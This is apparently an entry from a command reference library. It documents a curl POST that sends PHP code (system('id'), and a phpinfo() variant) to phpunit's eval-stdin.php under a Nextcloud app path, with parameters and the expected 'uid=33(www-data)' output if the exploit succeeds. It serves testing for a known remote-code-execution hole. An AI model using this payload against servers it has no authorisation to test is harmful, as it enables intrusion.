---
id: cmd-curl-post-test
data: >-
  curl -X POST
  http://nextcloud.example.com/index.php/apps/groupfolders/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
  -d '<?php system("id"); ?>'
tags:
  - rce
  - test
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.774Z'
verified: false
validated: true
submitted: true
---
# curl-post-test

## Command

```bash
curl -X POST http://nextcloud.example.com/index.php/apps/groupfolders/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d '<?php system("id"); ?>'
```

## Description

Sends a POST request with PHP payload to test for RCE via eval-stdin.php.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -X POST | Method | Yes |
| URL | Target endpoint | Yes |
| -d | Data payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target/eval-stdin.php -d 'payload'
```

### Advanced Usage

```bash
curl -X POST -d '<?php phpinfo(); ?>' --verbose URL
```

## Expected Output

Command output like 'uid=33(www-data)' if exploited.

## Related

- [[wget]]
